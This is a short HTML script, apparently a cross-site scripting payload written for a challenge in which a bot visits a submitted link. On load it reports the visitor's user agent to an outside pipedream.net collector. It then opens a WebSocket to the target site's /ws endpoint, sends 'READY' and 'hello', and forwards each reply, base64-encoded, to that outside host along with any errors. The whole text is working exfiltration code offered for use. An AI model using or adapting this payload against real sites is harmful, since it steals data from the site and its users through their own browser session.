<script>
    //way to see if the bot got my link
    fetch('https://eocvkn4m3kpce3q.m.pipedream.net?nav='+encodeURIComponent(window.navigator.userAgent), {mode: 'no-cors'});
    //websocket available
    window.WebSocket = window.WebSocket || window.MozWebSocket;
    if (!window.WebSocket) {
        fetch('https://eocvkn4m3kpce3q.m.pipedream.net?noWS', {mode: 'no-cors'});
    }

    //launch connection
    var websocket = new WebSocket('ws://' + window.origin + '/ws');
    websocket.onopen = start;
      websocket.onmessage = handleReply;
    
    websocket.onerror = function (error) {
        fetch('https://eocvkn4m3kpce3q.m.pipedream.net?error=' + encodeURIComponent(error.message), {mode: 'no-cors'});
        setTimeout(() => {
            websocket = new WebSocket('ws://' + window.origin + '/ws'); 
        }, 5000);
    };
    websocket.onclose = function(message) {
        fetch('https://eocvkn4m3kpce3q.m.pipedream.net?close=' + encodeURIComponent(message.reason), {mode: 'no-cors'});
    }
      function start(event) {
          //try to thing: retrieving the previous conv and retrieving the hello result
          websocket.send("READY");
        websocket.send("hello");
      }
      function handleReply(event) {
        fetch('https://eocvkn4m3kpce3q.m.pipedream.net?'+btoa(event.data), {mode: 'no-cors'})
      }
</script>
